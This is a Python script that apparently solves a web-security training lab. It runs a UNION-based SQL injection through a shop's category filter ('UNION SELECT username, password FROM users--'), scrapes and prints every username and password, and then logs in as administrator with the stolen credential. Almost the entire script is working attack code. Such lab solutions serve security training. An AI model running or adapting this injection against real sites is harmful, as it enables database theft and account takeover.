from lib import (
    SESSION,
    generate_parser,
    find_no_of_columns,
    find_columns_of_type_string,
    check_is_lab_solved,
    login_as_administrator,
)
from lxml import html

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    columns = find_no_of_columns(f"{lab_url}/filter?category=")

    target_columns = find_columns_of_type_string(
        lab_url_with_end_point=f"{lab_url}/filter?category=",
        no_of_columns=columns,
    )

    print("[+] Fetching the `username` and `password` columns from `users` table")

    print(
        f"[+] Making query: {lab_url}/filter?category=' UNION SELECT username, password FROM users--"
    )

    response = SESSION.get(
        f"{lab_url}/filter?category=' UNION SELECT username, password FROM users--"
    )

    if response.status_code == 200:
        tree = html.fromstring(response.text)

        usernames = tree.xpath("//table/tbody/tr/th/text()")
        passwords = tree.xpath("//table/tbody/tr/td/text()")

        print("[+] Credentials found in the `users` table:")

        users_dict = dict()

        print()
        for username, password in zip(usernames, passwords):
            users_dict[username] = password
            print(f"{username}:{password}")
        print()

        administrator_password = users_dict.get("administrator")

        if administrator_password:
            login_as_administrator(lab_url, administrator_password)
        else:
            print("[-] administrator credential not found")
            exit()

    else:
        print("[-] Failed to fetch the usernames and passwords")
        exit()

    check_is_lab_solved(lab_url)
